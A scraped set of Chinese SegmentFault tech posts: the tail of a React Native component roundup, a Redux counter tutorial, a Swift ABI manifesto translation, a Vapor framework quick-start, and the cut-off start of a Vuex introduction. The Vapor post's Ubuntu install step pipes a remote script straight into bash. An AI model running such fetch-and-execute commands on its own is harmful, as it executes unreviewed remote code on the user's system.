<blockquote><p>评价：组件比较多，不过设计风格一般</p></blockquote>
<ul><li><p><code>shoutem</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878156?w=1740&amp;h=980"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>团队github: <a href=""https://github.com/shoutem"" rel=""nofollow noreferrer"">https://github.com/shoutem</a>  <br><br> 在线文档：<a href=""http://shoutem.github.io/docs/ui-toolkit/introduction"" rel=""nofollow noreferrer"">http://shoutem.github.io/docs...</a></p>
<blockquote><p>评价：组件丰富，设计风格酷炫、团队也比较牛逼</p></blockquote>
<ul><li><p><code>Teaset</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878157?w=375&amp;h=667"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github: <a href=""https://github.com/rilyu/teaset"" rel=""nofollow noreferrer"">https://github.com/rilyu/teaset</a></p>
<blockquote><p>评价：国人作品，组件丰富，设计风格简约，比较适宜新手实用吧</p></blockquote>
<ul><li><p><code>react-native-material-design</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878158?w=1804&amp;h=1064"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/react-native-material-design/react-native-material-design"" rel=""nofollow noreferrer"">https://github.com/react-nati...</a></p>
<blockquote><p>评价：纯js编写，没有依赖，demo用的是Android</p></blockquote>
<ul><li><p><code>react-native-elements</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878159?w=1974&amp;h=1200"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github: <a href=""https://github.com/react-native-material-design/react-native-material-design"" rel=""nofollow noreferrer"">https://github.com/react-nati...</a>  <br><br> 在线文档：<a href=""http://react-native-material-design.github.io/"" rel=""nofollow noreferrer"">http://react-native-material-...</a></p>
<blockquote><p>评价：ReactNative作者操刀领导的作品，值得拥有</p></blockquote>
<ul><li><p><code>react-native-ui-kitten</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878160?w=250&amp;h=445"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github: <a href=""https://github.com/akveo/react-native-ui-kitten"" rel=""nofollow noreferrer"">https://github.com/akveo/reac...</a>  <br><br> 在线文档：<a href=""https://akveo.github.io/react-native-ui-kitten/articles/getting-started/"" rel=""nofollow noreferrer"">https://akveo.github.io/react...</a></p>
<blockquote><p>评价：一个酷炫简单的App组件Demo，适合新手学习</p></blockquote>
<hr>
<blockquote><p>@参考：<a href=""http://www.jianshu.com/p/53ff78168acc"" rel=""nofollow noreferrer"">React Native 项目常用第三方组件汇总</a></p></blockquote>
<p>欢迎关注我的个人博客  <a href=""http://jafeney.com"" rel=""nofollow noreferrer"">Jafeney</a></p>

                ", ReactNative开发常用的三方模块,1531971970,171,1,779,1,1,https://segmentfault.com/a/1190000008878128
68,1,0,6,"
                    
<h2>原始项目</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008741383"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""需求"" title=""需求""></span></p>
<p>这是非常简单的一个项目, 就是一个计数器, 只有两个文件<code>package.json</code>和<code>index.ios.js</code>, 点击<code>加1</code>按钮数字值就会+1, 点击<code>减1</code>按钮数字值就会-1, 点击<code>归零</code>按钮则数字值置为0;</p>
<p><code>index.ios.js</code>代码:</p>
<pre><code class=""js"">import React, { Component } from 'react';
import {
  AppRegistry,
  StyleSheet,
  Text,
  View,
  TouchableOpacity
} from 'react-native';

class Main extends Component {
  constructor(props) {
    super(props);
    this.state = { count: 5 }
  }

  _onPressReset() {
    this.setState({ count: 0 })
  }

  _onPressInc() {
    this.setState({ count: this.state.count+1 });
  }

  _onPressDec() {
    this.setState({ count: this.state.count-1 });
  }

  render() {
    return (
      &lt;View style={styles.container}&gt;
        &lt;Text style={styles.counter}&gt;{this.state.count}&lt;/Text&gt;
        &lt;TouchableOpacity style={styles.reset} onPress={()=&gt;this._onPressReset()}&gt;
          &lt;Text&gt;归零&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
        &lt;TouchableOpacity style={styles.start} onPress={()=&gt;this._onPressInc()}&gt;
          &lt;Text&gt;加1&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
        &lt;TouchableOpacity style={styles.stop} onPress={()=&gt;this._onPressDec()}&gt;
          &lt;Text&gt;减1&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
      &lt;/View&gt;
    );
  }
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    flexDirection: 'column'
  },
  counter: {
    fontSize: 50,
    marginBottom: 70
  },
  reset: {
    margin: 10,
    backgroundColor: 'yellow'
  },
  start: {
    margin: 10,
    backgroundColor: 'yellow'
  },
  stop: {
    margin: 10,
    backgroundColor: 'yellow'
  }
})

AppRegistry.registerComponent('Helloworld', () =&gt; Main);</code></pre>
<h2>添加redux</h2>
<p>先添加<code>redux</code>相关依赖库, 在<code>package.json</code>里添加三个库并在目录下<code>npm install</code>:</p>
<pre><code class=""json"">""dependencies"": {
    ...
    ""react-redux"": ""^4.4.5"",
    ""redux"": ""^3.5.2"",
    ""redux-logger"": ""^2.6.1""
},</code></pre>
<p>再创建<code>actionsTypes.js</code>用来定义所有的<code>action</code>名称, 定义三个<code>action</code>, 一个增加, 一个减小, 一个重置:</p>
<pre><code class=""js"">export const INCREASE = 'INCREASE';
export const DECREASE = 'DECREASE';
export const RESET = 'RESET';</code></pre>
<p>创建<code>actions.js</code>, 在里面创建三个<code>action</code>:</p>
<pre><code class=""js"">import { INCREASE, DECREASE, RESET } from './actionsTypes';

const increase = () =&gt; ({ type: INCREASE });
const decrease = () =&gt; ({ type: DECREASE });
const reset = () =&gt; ({ type: RESET });

export {
    increase,
    decrease,
    reset
}</code></pre>
<p>创建<code>reducers.js</code>, 根据需要在收到相关的<code>action</code>时操作项目的<code>state</code>:</p>
<pre><code class=""js"">import { combineReducers } from 'redux';
import { INCREASE, DECREASE, RESET} from './actionsTypes';

// 原始默认state
const defaultState = {
  count: 5,
  factor: 1
}

function counter(state = defaultState, action) {
  switch (action.type) {
    case INCREASE:
      return { ...state, count: state.count + state.factor };
    case DECREASE:
      return { ...state, count: state.count - state.factor };
    case RESET:
      return { ...state, count: 0 };
    default:
      return state;
  }
}

export default combineReducers({
    counter
});</code></pre>
<p>创建<code>store.js</code>:</p>
<pre><code class=""js"">import { createStore, applyMiddleware, compose } from 'redux';
import createLogger from 'redux-logger';
import rootReducer from './reducers';

const configureStore = preloadedState =&gt; {
    return createStore (
        rootReducer,
        preloadedState,
        compose (
            applyMiddleware(createLogger)
        )
    );
}

const store = configureStore();

export default store;</code></pre>
<p>至此<code>redux</code>的几大部分都创建完毕, 下一步就是引入项目中. 创建<code>app.js</code>和<code>home.js</code>.</p>
<p>index.ios.js更改:</p>
<pre><code class=""js"">import { AppRegistry } from 'react-native';
import App from './app';

AppRegistry.registerComponent('Helloworld', () =&gt; App);</code></pre>
<p>app.js</p>
<pre><code class=""js"">import React, { Component } from 'react';
import { Provider } from 'react-redux';
import Home from './home';
import store from './store';

export default class App extends Component {
  render() {
    return (
      &lt;Provider store={store}&gt;
        &lt;Home/&gt;
      &lt;/Provider&gt;
    );
  }
}</code></pre>
<p>home.js在原来<code>index.ios.js</code>的代码上修改成如下:</p>
<pre><code class=""js"">import React, { Component } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TouchableOpacity
} from 'react-native';
import { connect } from 'react-redux';
import { increase, decrease, reset } from './actions';

class Home extends Component {
  _onPressReset() {
    this.props.dispatch(reset());
  }

  _onPressInc() {
    this.props.dispatch(increase());
  }

  _onPressDec() {
    this.props.dispatch(decrease());
  }

  render() {
    return (
      &lt;View style={styles.container}&gt;
        &lt;Text style={styles.counter}&gt;{this.props.counter.count}&lt;/Text&gt;
        &lt;TouchableOpacity style={styles.reset} onPress={()=&gt;this._onPressReset()}&gt;
          &lt;Text&gt;归零&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
        &lt;TouchableOpacity style={styles.start} onPress={()=&gt;this._onPressInc()}&gt;
          &lt;Text&gt;加1&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
        &lt;TouchableOpacity style={styles.stop} onPress={()=&gt;this._onPressDec()}&gt;
          &lt;Text&gt;减1&lt;/Text&gt;
        &lt;/TouchableOpacity&gt;
      &lt;/View&gt;
    );
  }
}

const styles = StyleSheet.create({
  ...
})

const mapStateToProps = state =&gt; ({
    counter: state.counter
})

export default connect(mapStateToProps)(Home);</code></pre>
<p>OK, 大功告成, <code>commond+R</code>运行, <code>command+D</code>打开<code>chrome</code>浏览器调试, 可以看到<code>redux-logger</code>把每个<code>action</code>动作都打和<code>state</code>的前后变化印出来了,非常直观方便.</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008741384?w=598&amp;h=518"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""chrome log"" title=""chrome log""></span></p>

                ", redux在react-native上使用(一)--加入redux,1531971972,219,1,435,1,1,https://segmentfault.com/a/1190000008741380
69,1,0,6,"
                    
<p>翻译自Swift在Github上发布的<a href=""https://github.com/apple/swift/blob/master/docs/ABIStabilityManifesto.md"" rel=""nofollow noreferrer"">Swift ABI Manifesto</a></p>
<h4>Swift 4中ABI不会稳定对我们到底有多大影响？ABI究竟是什么？它稳定了又会怎样？达到ABI稳定为什么很困难？有哪些技术细节问题要处理？Swift官方又是如何看待当前Swift发展方向的？Michael Ilseman对这个问题进行了详细的阐述。由于原文较长，11就分几部分陆续分享给大家。希望大家对这个我们平时不太会关注的领域有些了解。</h4>
<p><a href=""https://boxueio.com/black-board/1"" rel=""nofollow noreferrer"">原文链接</a></p>
<hr>
<h2>蓝图</h2>
<p>当前，Swift最重要的工作之一，就是在多个版本之间保持兼容性。而所谓的兼容性，则是要在源码以及二进制层次上，分别达到它们各自的目标。</p>
<p>在源代码层次实现兼容，也就是让新版本的编译器可以编译老版本的Swift代码。这可以降低开发者在迁移到Swift新版本时的痛苦。没有源代码层次的兼容，用Swift编写的项目就很难得以传承，项目中所有的源代码和使用的程序库必须使用同一个版本的Swift语言。而提供了源代码层次的兼容性，程序库的作者就可以基于某个Swift版本只维护一套代码，并且让程序库的使用者使用更新版本的Swift。</p>
<p>程序库和运行时在二进制上的兼容性则让（用某个版本编译的）程序库在多个不同的Swift版本上进行分发成为可能。二进制的程序库包含了一个Swift module file，它提供了这个程序库API源代码级别的信息；以及一个共享的程序库文件，它包含了在运行时加载的编译之后的代码。因此，实现二进制的兼容性需要完成两目标：</p>
<p>首先，Swift module格式的稳定性可以让编译器用固定的方式表达程序库的公共接口，这也就是Swift module file的稳定性。这包括了API的声明以及代码是否可以inline的表达方式。编译器需要使用module file完成诸多必要的工作，例如，当编译程序库的客户端调用时，对其进行类型检查以及生成调用代码。</p>
<p>其次，ABI的稳定性则为使用不同版本Swift编译的程序库和应用程序提供了兼容性。这是这份文档接下来的部分关注的内容。这份文档探索并解释了什么是Swift ABI，并罗列了宣称Swift ABI已稳定前要进行的调查以及完成的目标。作为Swift社区的一份资源，这份文档也为Swift ABI的发展指明了方向。</p>
<p>这份文档中，会用""SR-xxxx""的形式，引用Swift issue tracking system中的内容。这些内容记录了和Swift ABI相关的工程和设计任务。</p>
<h2>什么是ABI？</h2>
<p>在运行时，通过Swift编写的二进制程序通过ABI和其他的程序库或组件进行交互。ABI是Application Binary Interface的缩写，它是一个规范，通过这个规范，所有被独立编译的二进制实体才能被链接在一起并执行。这些二进制实体必须在一些很低层的细节上达成一致，例如：如何调用函数，如何在内存中表示数据甚至是如何存储以及访问metadata。</p>
<p>ABI是平台相关的，因为它关注的这些底层细节会受到不同的硬件架构以及操作系统的的影响。大部分的平台都定义了一份可以用于C以及C语言家族代码的“标准ABI”。但Swift是一门和C截然不同的语言，它需要为每一种平台定义自己的ABI。而这份文档中中的绝大部分内容都是和平台无关的，和具体平台相关的考量会影响到Swift ABI的设计和实现细节。如果你要了解不同平台上的“标准ABI”，可以参考附录中的内容。</p>
<h2>什么是ABI稳定？</h2>
<p>ABI稳定是指把ABI锁定在某种形式，以至于未来的编译器都可以生成遵从这种形式的二进制实体（可以是程序库，也可以是应用程序）。一旦ABI稳定了，就意味着它会伴着这个平台的一生一世，直至日益增长的依赖关系让它走向灭亡。</p>
<p>ABI的稳定性仅会影响到外部可见的公共接口和符号的不变性。而内部使用的符号、调用约定以及内存格局仍旧可以修改而不会破坏ABI约定。例如，未来版本编译器完全可以在保留外部接口函数调用约定的同时，改变内部函数的调用约定。</p>
<p>对ABI做的每一个决定都会对编程语言产生长远的影响，甚至会制约一门编程语言在未来可以发展和进化的空间。Swift未来的版本可能会在更多垂直领域为ABI添加特性，但只要声明了某个平台的ABI已稳定，那么任何在效率以及灵活性上曾经不妥的设计都将永远伴着这个平台存在。</p>
<p>为ABI在垂直领域添加新的特性叫做ABI积累性更新（ABI-additive changes）。每当支持这个特性的Swift版本达到最小目标值的时候，就可以把这个特性纳入积累性更新。这种方式允许我们逐步扩展或锁定ABI中的内容。例如，让ABI支持更多特性，或使用更有效率的数据访问方式等。在这份文档后面，我们会看到很多这样的例子。</p>
<h2>ABI稳定了会怎样？</h2>
<p>ABI稳定之后，OS发行商就可以把Swift标准库和运行时作为操作系统的一部分嵌入，由于这些标准库和运行时可以支持用更老或更新版本Swift构建的应用程序，这样，开发者就无需在分发应用的同时，还要带上一份自己构建应用时使用的标准库和运行时拷贝。这使得工具和操作系统可以更好的进行集成。</p>
<p>就像之前提到的一样，对二进制程序库来说，ABI稳定是必要但不充分的。模块文件格式的稳定性也是必须的，但这超出了这份文档讨论的范畴。</p>
<h2>程序库的进化</h2>
<p>通常，如果一门编程语言在表现力和性能上均表现良好，并且还提供了二进制接口，它就很容易表现出二进制接口很脆弱的问题。对于用这种语言编写的程序库或组件来说，要让用户在不重新编译源码的条件下使用新版本的程序库是很难的。当前，Swift主要的前进方向是标准库的进化，自然就要给开发者在维护二进制兼容性这个问题上更多进退的空间。很多实现上的考量的确会对ABI的设计有所影响。</p>
<p>因此，迟迟没有声明ABI稳定的一个主要目的，就是为程序库的进化保留足够的灵活性，而不希望开发者由于ABI的稳定性而限制设计空间。程序库在进化上的考量将会在下面每一个单独的章节中描述，但它们阐述的一个公共的观点则是有些设计细节仍旧没有确定下来。</p>
<p>(To be continue...)</p>

                ", 译：Swift ABI (一),1531971973,333,1,891,1,1,https://segmentfault.com/a/1190000008575789
70,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008572609"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>简介</h3>
<p><a href=""https://vapor.codes/"" rel=""nofollow noreferrer"">Vapor</a> 是一个基于纯 Swift 构建出的 Web 开发框架，目前可以运行在 macOS 和 Ubuntu ，用于构建出漂亮易用的网站或者 API 服务。</p>
<p>官方称是<strong>用的最多</strong>的 Swift web 框架，理由是因其在 <a href=""https://swiftpkgs.ng.bluemix.net/browse?chart=mostessential&amp;page=1"" rel=""nofollow noreferrer"">IBM Swift Package CatalogBETA - Most Essential</a> 排名第一。But 对于一些星星党并不这么觉得，Perfect 星星还是多一些的 ;]。 个人觉得对于初心者朋友们选择一款主流、优雅、更新活跃的框架学习就好了，不必太在意那些。</p>
<p>当我第一眼看到 Vapor 的时候最吸引我的是 <a href=""https://vapor.codes/"" rel=""nofollow noreferrer"">vapor.codes</a> 这个网站，做的很漂亮，包括文档页面风格，很符合我的胃口，域名也很有个性，都说 vapor 是受 Laravel 启发，了解框架主要部件和一些语法后让我想起了 Python 的 Flask 框架，包括组件化思想、中间件，想起来都应该非常容易上手即扩展。</p>
<h3>文档</h3>
<p>Vapor 有一份比较完整的文档在 <a href=""http://docs.vapor.codes/"" rel=""nofollow noreferrer"">docs.vapor.codes</a>，你也可以在 <a href=""https://github.com/vapor/documentation"" rel=""nofollow noreferrer"">Github</a> 上对文档提出 issue 和 pr，不过目前看来 exmple 还比较缺少，稍稍高级一点的 API 或着最佳实践很难找到，估计也是因为整个这一块还比较新颖，成熟度不高，用户也相对较少的原因，不过相信在 Swift 日趋成熟的状态下，各个框架也会发展得越来越好。特别是在 <a href=""https://swift.org/server-apis/"" rel=""nofollow noreferrer"">Server APIs Project</a> 完成之后，相信会有一个大的转变，对了 Vapor 的核心开发成员 Logan Wright(<a href=""https://github.com/LoganWright"" rel=""nofollow noreferrer"">@LoganWright</a>) 也是Server APIs Project 团队的一员，所以看好 Vapor 的未来应该是没有错的。</p>
<blockquote><p>另外推荐一下 Ray Wenderlich 的一系列 Vapor ship教程，每个视频都是简短截说，非常实用，你可以在 <a href=""http://vapor.university/"" rel=""nofollow noreferrer"">vapor.university</a> 上找到，当然上面还有其他优秀的视频教程和文章。</p></blockquote>
<h3>组件</h3>
<ul>
<li>
<p>Vapor</p>
<ul>
<li><p>Auth</p></li>
<li><p>Sessions</p></li>
<li><p>Cookies</p></li>
<li><p>Routing</p></li>
</ul>
</li>
<li><p>Vapor Toolbox</p></li>
<li><p>Fluent</p></li>
<li>
<p>Engine</p>
<ul>
<li><p>HTTP</p></li>
<li><p>URI</p></li>
<li><p>WebSockets</p></li>
<li><p>SMTP</p></li>
</ul>
</li>
<li><p>Leaf</p></li>
<li><p>JSON</p></li>
<li><p>Console</p></li>
<li><p>TLS</p></li>
<li><p>Crypto</p></li>
<li><p>Node</p></li>
<li><p>Socks</p></li>
</ul>
<p>Vapor 使用 <a href=""https://swift.org/package-manager/"" rel=""nofollow noreferrer"">Swift Package Manager</a> 做依赖和包管理，不过以我个人目前的使用感受来看 Swift Package Manager 还不是很好用。</p>
<p>Vapor 封装了几乎常见的所有 web 开发部件，比如路由、授权认证、模版引擎、中间件、数据库ORM、JSON解析、Web sockets… 足以拿来让我们应付普通的 web 设计，让我们只需要更多的关心业务逻辑便可快速开发出自己的网站。该系列后面的文章会详细深入对每个部件进行探究。</p>
<h3>从 Toolbox 开始</h3>
<h4>安装</h4>
<p>Mac 用户推荐用 Homebrew 安装 vapor toolbox，toolbox 也是 Swift 写的，仓库在<a href=""https://github.com/vapor/toolbox"" rel=""nofollow noreferrer"">这里</a>。</p>
<pre><code># install Vapor Toolbox
brew install vapor/tap/toolbox</code></pre>
<p>第一次安装的时候遇到问题，卡在 <code>unset CC; swift build -c release</code> 很久不动，后来又可以了，估计还是因为网络问题，建议大家安装时都开上代理。<a href=""https://github.com/vapor/toolbox/issues/111"" rel=""nofollow noreferrer"">#11</a></p>
<h4>介绍</h4>
<p>vapor toolbox 是封装的一套命令行工具，基础命令如下：</p>
<pre><code>Usage: vapor &lt;new|build|run|fetch|clean|test|xcode|version|self|heroku|docker&gt;</code></pre>
<ul>
<li><p>new - 新建项目</p></li>
<li><p>build - 编译（内部会执行 <code>swift build</code>）</p></li>
<li><p>run - 运行项目</p></li>
<li><p>fetch - 拉取定义在 <strong>Package.swift</strong> 中的依赖</p></li>
<li><p>clean - 清除缓存</p></li>
<li><p>test - 执行测试</p></li>
<li><p>xcode - 生成  <code>.xcodeproj</code> 用于使用 xcode 进行开发</p></li>
<li><p>version - 查看 vapor toolbox 版本号</p></li>
<li><p>self - <code>vapor self &lt;install|update&gt;</code> 用来自更新</p></li>
<li><p>heroku - 部署到 heroku</p></li>
<li><p>docker - 部署到 docker</p></li>
</ul>
<h4>Xcode</h4>
<p>我们可以使用 <code>vapor xcode</code> 生成 xcode 项目，然后就可以直接使用 xcode 进行 web 开发了，编辑源代码，<code>Command + R</code> 一切还是那么熟悉（对于 iOS 开发者来说）。:]</p>
<blockquote><p>注意：因为这个 .xcodeproj 项目的目录结构都是 vapor 自动生成的，所以目录结构有变动我们可以再执行一次 <code>vapor xcode</code> 命令重新生成，并且在为了不干扰其他协同人员在 linux 环境下开发，推荐在 <code>.gitignore</code> 中加入这一行 <code>*.xcodeproj</code> 以忽略其进入 git。</p></blockquote>
<h3>Hello, World</h3>
<p>前面讲了这么多介绍、环境、工具，这里主要带大家跑起来一个 hello,world 项目。</p>
<h4>Toolbox</h4>
<p>整个流程都会基于 Vapor Toolbox 的命令完成，所以你的第一步应该是装好这个东西。</p>
<p>Mac 用户推荐用 Homebrew 安装 vapor toolbox，toolbox 也是 Swift 写的，仓库在 <a href=""https://github.com/vapor/toolbox"" rel=""nofollow noreferrer"">Github</a>。</p>
<pre><code># macOS
brew install vapor/tap/toolbox

# Ubuntu
curl -sL swift.vapor.sh/ubuntu | bash</code></pre>
<p>第一次安装的时候遇到问题，卡在 <code>unset CC; swift build -c release</code> 很久不动，后来又可以了，估计还是因为网络问题，建议大家安装时都开上代理。<a href=""https://github.com/vapor/toolbox/issues/111"" rel=""nofollow noreferrer"">#11</a></p>
<p>更多可以参考官方文档页面 <a href=""https://vapor.github.io/documentation/getting-started/install-toolbox.html"" rel=""nofollow noreferrer"">install Toolbox</a></p>
<h4>New Project</h4>
<p>如果你是 iOS 开发者，这里请暂时先忘掉 Xcode，因为所有环境和开发都能在 Linux 中完成。</p>
<pre><code>vapor new Hello</code></pre>
<p>执行完成后大概会看到这样的界面：</p>
<pre><code>Cloning Template [Done]

                                      **
                                    **~~**
                                  **~~~~~~**
                                **~~~~~~~~~~**
                              **~~~~~~~~~~~~~~**
                            **~~~~~~~~~~~~~~~~~~**
                          **~~~~~~~~~~~~~~~~~~~~~~**
                         **~~~~~~~~~~~~~~~~~~~~~~~~**
                        **~~~~~~~~~~~~~~~~~~~~~~~~~~**
                       **~~~~~~~~~~~~~~~~~~~~~~~~~~~~**
                       **~~~~~~~~~~~~~~~~~~~~~~~~~~~~**
                       **~~~~~~~~~~~~~~~~~~~~~++++~~~**
                        **~~~~~~~~~~~~~~~~~~~++++~~~**
                         ***~~~~~~~~~~~~~~~++++~~~***
                           ****~~~~~~~~~~++++~~****
                              *****~~~~~~~~~*****
                                 *************
                        
                        _       __    ___   ___   ___
                       \ \  /  / /\  | |_) / / \ | |_)
                        \_\/  /_/--\ |_|   \_\_/ |_| \
                          a web framework for Swift

                      Project ""Hello"" has been created.
               Type `cd Hello` to enter the project directory.
                                    Enjoy!</code></pre>
<p><code>vapor new</code> 命令将会从 <a href=""https://github.com/vapor/basic-template"" rel=""nofollow noreferrer"">vapor/basic-template</a> 拉取初始工程，目录结构如下：</p>
<pre><code>.
├── Config
│   └── production
├── Localization
├── Public
│   ├── images
│   └── styles
├── Resources
│   └── Views
└── Sources
    └── App
        ├── Controllers
        └── Models</code></pre>
<p>项目采用 MVC 架构，<strong>Model</strong> 和 <strong>Controller</strong> 在 <em>Source/App</em> 下，同级还有个 <strong>main.swift</strong>，这就是整个程序的主文件，<em>Resources/Views</em> 里放的是页面模版。</p>
<h4>main.swift</h4>
<pre><code>import Vapor

let drop = Droplet()

drop.get(""hello"") { req in
    return ""Hello, world.""
}

drop.run()</code></pre>
<p>大家感受一下路由，最终这份代码将会在浏览器中呈现出 “Hello, world.” 这个字符串，这一篇文章暂时并不会说太多代码，只是让大家了解感受下 Vapor 开发的整个流程，后面会深入其中。</p>
<h4>Fetch</h4>
<p>编译之前需要拉取项目所有的第三方库，也就是依赖包，Vapor 使用 Swift Package Manager 来管理包，使用  toolbox 中的 <code>vapor fetch</code> 命令进行拉取依赖，拉取到本地后后所有的包源码将会在 <code>Packages</code> 目录中，如下：</p>
<pre><code>CLibreSSL-1.0.0     Fluent-1.1.0        Node-1.0.1          Turnstile-1.0.3
CMySQL-1.0.0        FluentMySQL-1.0.1   PathIndexable-1.0.0 Vapor-1.2.0
Console-1.0.1       JSON-1.0.1          Polymorphic-1.0.1   VaporMySQL-1.1.0
Core-1.0.0          Jay-1.0.0           Routing-1.0.1
Crypto-1.0.1        Leaf-1.0.3          Socks-1.2.0
Engine-1.3.0        MySQL-1.0.2         TLS-1.1.0</code></pre>
<blockquote><p>这一步就像是 iOS 开发中的 pod install … ;]</p></blockquote>
<h4>Build</h4>
<p>拉取完依赖之后就可以执行 <code>vapor build</code> 开始编译项目，然而其实 <code>vapor build</code> 也会去 Fetching Dependencies，所以直接执行这个命令也是可以的。</p>
<p>编译完成后你会在项目根目录下发现一个 <code>.build</code> 目录，这里面将会存放项目所有源码编译后的文件。</p>
<p>如果使用 xcode 只要不更新依赖，直接 <code>Command+B</code> 进行编译， <code>Command+R</code> 运行。</p>
<h3>Run</h3>
<p>编译成功后通过下面这条命令来启动服务器。</p>
<pre><code>vapor run serve</code></pre>
<p>如果看到 <code>Server starting...</code> 的字样，那就可以通过浏览器访问 <code>http://localhost:8080</code> 进行访问了。</p>
<h3>部署</h3>
<p>Vapor 支持任何能运行 Swift 环境的地方，轻松搭配 Nginx 等通用服务器程序进行部署。比如 Digital Ocean、Docker、Heroku、AWS 等等，甚至还支持一键部署到 Heroku，Heroku 为个人用户提供了一个免费沙盒（512 MB RAM │ 1 web/1 worker），只是会在闲置30分钟后自动睡眠，如果你想尝试，Just do it，非常简单。</p>
<h3>社区</h3>
<ul>
<li><p><a href=""https://github.com/vapor/vapor"" rel=""nofollow noreferrer"">Github</a></p></li>
<li><p><a href=""http://slack.qutheory.io/"" rel=""nofollow noreferrer"">Slack</a></p></li>
</ul>
<h3>捐赠</h3>
<p>作为一个非营利开源项目组织，他们非常愿意接受资金赞助以保持项目积极发展，所以如果你喜欢这个项目并想支持 Vapor，这将会是一个很好的方式。</p>
<p>Vapor 在 <a href=""https://opencollective.com/vapor"" rel=""nofollow noreferrer""><em>OpenCollective</em></a> 开通了捐赠页面，在其 Github 主页可以找到相关链接，</p>
<blockquote><p>OpenCollective 是一个用于开源社区募集资金的平台，主张财务透明，可在其页面上看到任何人的捐赠记录。</p></blockquote>
<p>个人觉得支持一个项目的更好方式是为其“添砖加瓦”，把你更多的灵感和代码注入到项目里。</p>
<h3>推荐阅读</h3>
<ul>
<li><p><a href=""https://realm.io/news/slug-edward-jiang-server-side-swift/"" rel=""nofollow noreferrer"">Super Spectacular Server-Side Swift!</a></p></li>
<li><p><a href=""https://medium.com/@rymcol/benchmarks-for-the-top-server-side-swift-frameworks-vs-node-js-24460cfe0beb"" rel=""nofollow noreferrer"">Benchmarks for the Top Server-Side Swift Frameworks vs. Node.js</a></p></li>
<li><p><a href=""https://medium.com/@rymcol/linux-ubuntu-benchmarks-for-server-side-swift-vs-node-js-db52b9f8270b"" rel=""nofollow noreferrer"">Linux (Ubuntu) Benchmarks for Server Side Swift vs Node.js</a></p></li>
<li><p><a href=""http://vapor.university/"" rel=""nofollow noreferrer"">vapor.university</a></p></li>
</ul>
<h3>后记</h3>
<p>【Swift Web 开发之 Vapor】第一篇就这样了，Vapor 内容很多，“入门”旨在争取看完能够搭建好环境和跑起来示例程序并对这个框架有个初步认识就可以了，后续我会继续分享 Vapor 相关的其他组件和使用经验。</p>
<p>用了近一个月的 Vapor，开了一个坑准备写一个博客程序 <a href=""https://github.com/isaced/NSPress"" rel=""nofollow noreferrer"">NSPress</a>，类似 Wordpress、Typecho，后面的坑很多，比如插件、模版系统的架构，也是一次 Swift server-side 的学习与尝试，希望有兴趣的朋友可以一起学习与交流，你可以在 <a href=""http://weibo.com/2034474825"" rel=""nofollow noreferrer"">微博</a>、 <a href=""https://github.com/isaced"" rel=""nofollow noreferrer"">Github</a> 关注我，或者给我发邮件 <em><a>isaced@163.com</a></em>。</p>

                ", Swift Web 开发之 Vapor - 入门（一）,1531971975,466,1,669,1,1,https://segmentfault.com/a/1190000008572606
71,1,0,6,"
                    
<blockquote><p>系列文章的目录在 ? <a href=""https://segmentfault.com/a/1190000008342533"" rel=""nofollow noreferrer"">这里</a></p></blockquote>
<h2>什么是 Vuex ？</h2>
<blockquote><p><a href=""https://vuex.vuejs.org/zh-cn/"" rel=""nofollow noreferrer"">Vuex 官方文档</a></p></blockquote>
<p>Vuex 是一个专为 Vue.js 应用程序开发的 <strong>状态管理模式</strong>。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>
<p>Vuex 的核心工作是状态管理，主要包含了 <code>State</code>, <code>View</code> <code>Actions</code> 这三部分，组成了一个简单的“单项数据流”，避免了管理多状态造成的数据不一致问题。</p>
<p><span class=""img-wrap""><img data-src=""https://vuex.vuejs.org/zh-cn/images/flow.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Data Flow"" title=""Data Flow""></span></p>
<p>Vuex 是专门为 Vue.js 设计的状态管理库，贴合 Vue 本身的数据更新特性，能够利用 Vue.js 的细粒度数据响应机制来进行高效的状态更新。而且可以是以 插件（plugin）的形式提供，安装完成之后可以很方便的在 VueComponent 实例中获取到全局状态。模块之间的关系和操作如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""https://vuex.vuejs.org/zh-cn/images/vuex.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Vuex Structure"" title=""Vuex Structure""></span></p>
<ul>
<li><p><code>State</code>: 应用的<a href=""https://vuex.vuejs.org/zh-cn/state.html"" rel=""nofollow noreferrer"">单一状态树</a>。通常一个应用里只保存同一份状态（组件仍然可以保有局部状态），为的是便于多个组件之间的状态同步。状态的更新将会触发指定组件的重新渲染。</p></li>
